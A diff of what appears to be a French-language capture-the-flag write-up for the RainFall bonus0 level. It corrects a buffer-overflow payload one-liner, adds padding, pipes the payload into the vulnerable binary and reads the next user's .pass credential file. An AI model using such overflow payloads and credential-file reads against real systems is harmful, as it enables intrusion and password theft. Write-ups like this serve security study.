@@ -71,9 +71,12 @@ https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generato
 
 offset = 9
 
-python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x31\xf8\xff\xbf'  > /tmp/test
+python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x30\xf8\xff\xbf'"  > /tmp/test
 
 On se segfault plus, la string n'est plus assez longue ! Il suffit de rajouter au moins 7 characteres derriere pour remplir le buffer de 20 ( 20 - 9 - 4(adresse) = 7)
 
+python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x30\xf8\xff\xbf' + 'A'*7 "  > /tmp/test
 
-bonus0@RainFall:~$(python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x31\xf8\xff\xbf' + 'A'*7" ; cat -) | ./bonus0
+bonus0@RainFall:~$ cat /tmp/test - | ./bonus0
+
+cat /home/user/bonus1/.pass
